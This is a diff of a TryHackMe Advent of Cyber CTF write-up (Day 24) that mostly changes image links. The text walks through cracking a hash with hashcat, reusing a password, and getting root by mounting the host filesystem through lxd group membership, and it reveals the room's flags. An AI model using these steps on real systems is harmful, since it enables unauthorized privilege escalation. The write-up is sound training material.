+   ![Show Databases](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Databases.png)
    
    Now we can do the same with the `tron` table.
    
@@ -1842,7 +1842,7 @@ stty raw -echo; fg
    show tables
    ```
    
-   ![Tron Creds](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Tron_User_Creds.png)
+   ![Tron Creds](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Tron_User_Creds.png)
 
    ><details><summary>Click for answer</summary>tron</details>
 
@@ -1850,21 +1850,21 @@ stty raw -echo; fg
 
    We can use `hash-identifier` to find out what hash type this password is in.
    
-   ![Hash Identifier](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Hash_Identifier.png)
+   ![Hash Identifier](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Hash_Identifier.png)
    
    Now we can use `hashcat` to crack this password. Add the hash to a file and run the following command:
    
-   ![Hash File](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Hash_File.png)
+   ![Hash File](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Hash_File.png)
    
    ```cmd
    hashcat m 0 tron-password.hash /usr/share/wordlists/rockyou.txt
    ```
    
-   ![Hash Command](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Hashcat_Command.png)
+   ![Hash Command](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Hashcat_Command.png)
    
    This gives us a result for the password.
    
-   ![Hashcat Password](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Hashcat_Password.png)
+   ![Hashcat Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Hashcat_Password.png)
 
    ><details><summary>Click for answer</summary>@computer@</details>
 
@@ -1878,11 +1878,11 @@ Use su to login to the newly discovered user by exploiting password reuse.
    su flynn
    ```
    
-   ![Switch User](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Switch_User.png)
+   ![Switch User](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Switch_User.png)
    
    Now we can look for the contents of the flag.
    
-   ![Flynn Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Flynn_Flag.png)
+   ![Flynn Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Flynn_Flag.png)
 
    ><details><summary>Click for answer</summary>THM{IDENTITY_DISC_RECOGNISED}</details>
 
@@ -1890,7 +1890,7 @@ Use su to login to the newly discovered user by exploiting password reuse.
 
     To get the group a user belongs to, we can use `id`. Looks like there is an extra group which we can exploit.
     
-    ![Group ID](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_ID.png)
+    ![Group ID](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_ID.png)
 
     ><details><summary>Click for answer</summary>lxd</details>
 
@@ -1911,7 +1911,7 @@ Abuse this group to escalate privileges to root.
     - Initialize the image inside a new container <- **Worth checking the already imported/available images as you may be able to skip to this step**
     - Mount the container inside the /root directory
     
-    ![Lxc Images](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Lxc_Images.png)
+    ![Lxc Images](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Lxc_Images.png)
     
     Checking for any available images, we can indeed see it is already present on the machine. This saves us a bunch of work and we can continue with initializing the container.
     
@@ -1921,7 +1921,7 @@ Abuse this group to escalate privileges to root.
     $ lxc config device add letmein rightnow disk source=/ path=/mnt/root recursive=true
     ```
     
-    ![Lxc Initialize](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Lxc_Initialize.png)
+    ![Lxc Initialize](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Lxc_Initialize.png)
     
     Now we can start the container and open a shell through it. Then we should check which user we are with `id`.
     
@@ -1931,11 +1931,11 @@ Abuse this group to escalate privileges to root.
     $ lxc exec letmein /bin/sh
     ```
     
-    ![Lxc Start](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Lxc_Start_Container.png)
+    ![Lxc Start](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Lxc_Start_Container.png)
     
     Perfect! Now we can navigate to the root flag and view its contents.
     
-    ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Root_Flag.png)
+    ![Root Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Root_Flag.png)
 
     ><details><summary>Click for answer</summary>THM{FLYNN_LIVES}</details>
 
@@ -1943,16 +1943,16 @@ Abuse this group to escalate privileges to root.
 
 During our directory enumeration, we found some other webpages as well. 
 
-![Optional page](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Optional_Site.png)
+![Optional page](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Optional_Site.png)
 
 These seem to contain many links. Of which most probably link to the Rick roll video. We can make a python script to gather all the available links on the page for us to analyze. This is similar to what we did in day 16.
 
-![Python Script](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Link_Script.png)
+![Python Script](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Link_Script.png)
 
 Running this we can a whole list of links from the page.
 
-![Links](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Links.png)
+![Links](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Links.png)
 
 Most of these indeed lead to a video, but one of them leads to an interesting discount. Which probably isn't valid anymore. So it is of no use, but it is an interesting exercise.
 
-![Free Code](https://github.com/Kevinovitz/TryHackMe_Writeups/blob/main/adventofcyber2/Day%2024/Trail_Free_Code.png)
+![Free Code](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/adventofcyber2/Day%2024/Trail_Free_Code.png)
